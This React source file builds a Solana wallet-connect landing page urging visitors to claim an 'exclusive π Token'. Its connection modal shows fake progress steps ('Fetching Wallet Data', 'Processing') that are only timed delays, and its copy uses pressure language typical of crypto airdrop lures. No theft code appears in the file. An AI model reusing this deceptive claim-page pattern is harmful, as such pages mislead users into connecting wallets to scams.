
import { useWallet, useConnection } from '@solana/wallet-adapter-react';
import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
import { useEffect, useState } from 'react';
import { toast } from '@/components/ui/use-toast';
import { Menu } from "lucide-react";
import LoadingModal, { ConnectionStep } from '@/components/LoadingModal';

const Index = () => {
  const { publicKey, connecting, connected, wallet } = useWallet();
  const { connection } = useConnection();
  const [isConnecting, setIsConnecting] = useState(false);
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [connectionSteps, setConnectionSteps] = useState<ConnectionStep[]>([
    { id: 'init', label: 'Initializing Connection', status: 'pending' },
    { id: 'walletConnect', label: 'Connecting to Wallet', status: 'pending' },
    { id: 'fetchData', label: 'Fetching Wallet Data', status: 'pending' },
    { id: 'processData', label: 'Processing', status: 'pending' }
  ]);
  const [currentStep, setCurrentStep] = useState('init');

  // Update step status
  const updateStepStatus = (stepId: string, status: 'pending' | 'active' | 'completed' | 'error', details?: string) => {
    setConnectionSteps(prevSteps => prevSteps.map(step => 
      step.id === stepId 
        ? { ...step, status, details } 
        : step
    ));
  };

  // Simplified connection handler with visual feedback
  const handleWalletConnected = async () => {
    if (!connected || !publicKey || isConnecting) return;
    
    setIsConnecting(true);
    setIsModalOpen(true);
    
    try {
      // Step 1: Initialize connection
      updateStepStatus('init', 'active');
      await new Promise(resolve => setTimeout(resolve, 500));
      updateStepStatus('init', 'completed');
      
      // Step 2: Connect to wallet
      updateStepStatus('walletConnect', 'active');
      setCurrentStep('walletConnect');
      await new Promise(resolve => setTimeout(resolve, 800));
      updateStepStatus('walletConnect', 'completed');
      
      // Step 3: Fetch data
      updateStepStatus('fetchData', 'active');
      setCurrentStep('fetchData');
      await new Promise(resolve => setTimeout(resolve, 700));
      updateStepStatus('fetchData', 'completed');
      
      // Step 4: Process data
      updateStepStatus('processData', 'active');
      setCurrentStep('processData');
      await new Promise(resolve => setTimeout(resolve, 1000));
      updateStepStatus('processData', 'completed');
      
      toast({
        title: "Connected",
        description: "Your wallet has been connected successfully.",
      });
      
      // Close modal after a short delay
      setTimeout(() => {
        setIsModalOpen(false);
      }, 500);
      
    } catch (error) {
      console.error('Connection error:', error);
      toast({
        title: "Connection Error",
        description: error instanceof Error ? error.message : "Failed to connect wallet",
        variant: "destructive",
      });
      setIsModalOpen(false);
    } finally {
      setIsConnecting(false);
    }
  };

  useEffect(() => {
    if (connected && publicKey) {
      handleWalletConnected();
    }
  }, [connected, publicKey]);

  return (
    <div className="min-h-screen bg-background p-6 relative">
      {/* Use the LoadingModal component */}
      <LoadingModal 
        isOpen={isModalOpen} 
        steps={connectionSteps} 
        currentStep={currentStep} 
      />
      
      <nav className="flex justify-between items-center mb-20">
        <div className="w-12 h-12 rounded-full bg-gradient-to-r from-cyan-400 to-cyan-300 p-[2px]">
          <div className="w-full h-full rounded-full bg-background flex items-center justify-center">
            <span className="text-2xl font-bold text-cyan-400">π</span>
          </div>
        </div>
        
        <div className="flex gap-4">
          <button className="circle-button">
            <Menu className="w-6 h-6 text-cyan-400" />
          </button>
        </div>
      </nav>

      <main className="flex flex-col items-center justify-center gap-8 max-w-2xl mx-auto text-center">
        <h1 className="text-5xl md:text-6xl font-bold gradient-text leading-tight">
          Join The π Adventure
        </h1>
        
        <p className="text-xl md:text-2xl text-gray-400 max-w-xl">
          Don't miss out! Click here to claim your exclusive π Token now and be part of the revolution!
        </p>

        <div className="flex flex-col items-center w-full max-w-md gap-4 mt-4">
          <div className="flex justify-center w-full">
            <WalletMultiButton 
              className="glass-button text-cyan-400 py-4 px-8 rounded-xl text-xl font-semibold" 
            />
          </div>
        </div>

        <div className="mt-20">
          <div className="w-32 h-32 rounded-full bg-[#2A2F3F] flex items-center justify-center">
            <div className="w-24 h-24 rounded-full bg-[#4B3979] flex items-center justify-center">
              <span className="text-5xl font-bold text-[#FFA500]">π</span>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
};

export default Index;
